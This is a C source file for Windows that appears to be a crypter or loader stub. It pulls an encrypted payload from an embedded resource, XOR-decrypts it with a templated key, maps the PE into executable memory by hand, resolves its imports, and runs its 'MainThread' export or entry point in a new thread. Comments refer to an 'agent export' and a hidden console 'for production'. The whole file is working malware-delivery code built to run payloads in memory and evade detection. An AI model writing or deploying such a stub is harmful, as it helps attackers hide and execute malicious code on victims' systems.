#include <windows.h>
#include <stdio.h>

// --- Config ---
#define IDR_PAYLOAD 101

unsigned char g_M[] = {{KEY}}; 

// Function pointer for the agent export
typedef void (*pMainThread)();

// --- PE Loader (Stable) ---
void* LoadPE(void* p) {
    PIMAGE_DOS_HEADER d = (PIMAGE_DOS_HEADER)p;
    if (d->e_magic != 0x5A4D) return NULL;
    PIMAGE_NT_HEADERS n = (PIMAGE_NT_HEADERS)((char*)p + d->e_lfanew);

    void* b = VirtualAlloc(NULL, n->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!b) return NULL;

    memcpy(b, p, n->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(n);
    for (int i = 0; i < n->FileHeader.NumberOfSections; i++) {
        if (s->SizeOfRawData > 0) memcpy((char*)b + s->VirtualAddress, (char*)p + s->PointerToRawData, s->SizeOfRawData);
        s++;
    }

    DWORD64 dlt = (DWORD64)b - n->OptionalHeader.ImageBase;
    if (dlt != 0 && n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        PIMAGE_BASE_RELOCATION r = (PIMAGE_BASE_RELOCATION)((char*)b + n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (r->VirtualAddress) {
            DWORD c = (r->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* l = (WORD*)(r + 1);
            for (DWORD i = 0; i < c; i++) if ((l[i] >> 12) == IMAGE_REL_BASED_DIR64) *(DWORD64*)((char*)b + r->VirtualAddress + (l[i] & 0xFFF)) += dlt;
            r = (PIMAGE_BASE_RELOCATION)((char*)r + r->SizeOfBlock);
        }
    }

    if (n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        PIMAGE_IMPORT_DESCRIPTOR im = (PIMAGE_IMPORT_DESCRIPTOR)((char*)b + n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        while (im->Name) {
            HMODULE hM = LoadLibraryA((char*)b + im->Name);
            if (hM) {
                PIMAGE_THUNK_DATA t = (PIMAGE_THUNK_DATA)((char*)b + im->FirstThunk);
                PIMAGE_THUNK_DATA o = (PIMAGE_THUNK_DATA)((char*)b + (im->OriginalFirstThunk ? im->OriginalFirstThunk : im->FirstThunk));
                while (o->u1.AddressOfData) {
                    if (IMAGE_SNAP_BY_ORDINAL(o->u1.Ordinal)) t->u1.Function = (DWORD64)GetProcAddress(hM, (char*)(o->u1.Ordinal & 0xFFFF));
                    else t->u1.Function = (DWORD64)GetProcAddress(hM, ((PIMAGE_IMPORT_BY_NAME)((char*)b + o->u1.AddressOfData))->Name);
                    t++; o++;
                }
            }
            im++;
        }
    }

    return b;
}

// Find export manually in loaded PE
void* GetExport(void* b, const char* name) {
    PIMAGE_DOS_HEADER d = (PIMAGE_DOS_HEADER)b;
    PIMAGE_NT_HEADERS n = (PIMAGE_NT_HEADERS)((char*)b + d->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY e = (PIMAGE_EXPORT_DIRECTORY)((char*)b + n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    DWORD* names = (DWORD*)((char*)b + e->AddressOfNames);
    WORD* ordinals = (WORD*)((char*)b + e->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((char*)b + e->AddressOfFunctions);

    for (DWORD i = 0; i < e->NumberOfNames; i++) {
        if (strcmp(name, (char*)b + names[i]) == 0) {
            return (char*)b + funcs[ordinals[i]];
        }
    }
    return NULL;
}

void Start() {
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCE(IDR_PAYLOAD), RT_RCDATA);
    if (!hRes) return;
    HGLOBAL hResData = LoadResource(NULL, hRes);
    void* pData = LockResource(hResData);
    DWORD dwSize = SizeofResource(NULL, hRes);

    unsigned char* p = (unsigned char*)malloc(dwSize);
    memcpy(p, pData, dwSize);

    int kl = sizeof(g_M);
    for (int i = 0; i < (int)dwSize; i++) p[i] = p[i] ^ g_M[i % kl] ^ (unsigned char)(i & 0xFF);

    void* b = LoadPE(p);
    if (b) {
        // Try calling the export for stability
        pMainThread fn = (pMainThread)GetExport(b, "MainThread");
        if (fn) {
            HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)fn, NULL, 0, NULL);
            if (hThread) WaitForSingleObject(hThread, INFINITE);
        } else {
            // Fallback to EntryPoint if export not found
            PIMAGE_DOS_HEADER d = (PIMAGE_DOS_HEADER)b;
            PIMAGE_NT_HEADERS n = (PIMAGE_NT_HEADERS)((char*)b + d->e_lfanew);
            HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD64)b + n->OptionalHeader.AddressOfEntryPoint), NULL, 0, NULL);
            if (hThread) WaitForSingleObject(hThread, INFINITE);
        }
    }
}

int main() {
    // Hidden console for production, can show for debug
    // AllocConsole(); freopen("CONOUT$", "w", stdout);
    Start();
    return 0;
}